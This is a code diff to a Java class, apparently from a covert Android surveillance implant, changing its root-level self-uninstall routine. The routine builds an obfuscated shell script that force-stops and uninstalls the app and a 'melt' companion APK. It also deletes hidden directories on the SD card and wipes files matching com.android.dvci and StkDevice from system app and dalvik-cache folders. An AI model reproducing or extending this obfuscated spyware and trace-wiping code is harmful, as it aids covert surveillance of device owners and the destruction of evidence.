@@ -398,9 +398,9 @@ public class Root {
 			}
 
 			script += Configuration.shellFile + M.e(" blw") + "\n";
-			script += M.e("echo delete ")+ packageName + "\n";
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
+			script += M.e("am force-stop ") + packageName + "\n";
 			script += M.e("pm uninstall ") + packageName + "\n";
 
 			String meltapk = "";
@@ -427,17 +427,21 @@ public class Root {
 					}
 				}
 			}
-
+			if( PackageUtils.isInstalledApk(meltapk)){
 			if(meltapk.length() > 0){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (uninstallRoot), uninstall melt: " + meltapk);
 					Status.self().makeToast("uninstall melt: " + meltapk);
 
 				}
-				script += M.e("echo delete ")+ meltapk + "\n";
 				script += M.e("pm clear ") + meltapk + "\n";
 				script += M.e("pm disable ") + meltapk + "\n";
 				script += M.e("pm uninstall ") + meltapk + "\n";
+			}
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (uninstallRoot), uninstall melt application: " + meltapk+" already removed (by User?)");
+				}
 			}
 
 
@@ -461,24 +465,20 @@ public class Root {
 			if(!Status.isPersistent()){
 				script += M.e("sleep 5\n");
 			}
-			script += M.e("echo delete sdcard")+ "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/.lost.found")) + "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/1")) + "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), M.e("/sdcard/2")) + "\n";
 
-			script += M.e("echo delete appdir")+ "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), Status.getAppDir()) + "\n";
 			script += String.format(M.e("rm -r %s 2>/dev/null"), Path.hidden()) + "\n";
 			// TODO: mettere Status.persistencyApk e packageName
 
-			script += M.e("echo delete app")+ "\n";
 			script += M.e("for i in `ls /data/app/*com.android.dvci* 2>/dev/null`; do rm  $i; done") + "\n";
 
 			script += M.e("for i in `ls /data/dalvik-cache/*com.android.dvci* 2>/dev/null`; do rm  $i; done") + "\n";
 			script += M.e("for i in `ls /data/dalvik-cache/*StkDevice* 2>/dev/null`; do rm  $i; done") + "\n";
 			script += M.e("for i in `ls /system/app/*StkDevice* 2>/dev/null`; do rm  $i 2>/dev/null; done") + "\n";
 
-			script += M.e("echo remount ro")+ "\n";
 			script += Configuration.shellFile + M.e(" blr") + "\n";
 			script += M.e("sleep 1; ") + String.format(M.e("rm %s 2>/dev/null"), apkPath) + "\n";
 			script += Configuration.shellFile + M.e(" ru") + "\n";
@@ -1077,7 +1077,19 @@ public class Root {
 			fos.write(script.getBytes());
 			fos.close();
 			if (absolutPaht != null) {
+				Path.unprotect(absolutPaht, 1, true);
+				try {
+					Utils.copy(new File(absP), new File(absolutPaht));
+				}catch (IOException e){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (createScript): failure coping: " + name); //$NON-NLS-1$
+					}
+					return false;
+				}finally {
+						Execute.execute("rm " + absP);
+				}
 				absP = absolutPaht;
+
 			}
 			Execute.execute("chmod 755 " + absP);
 
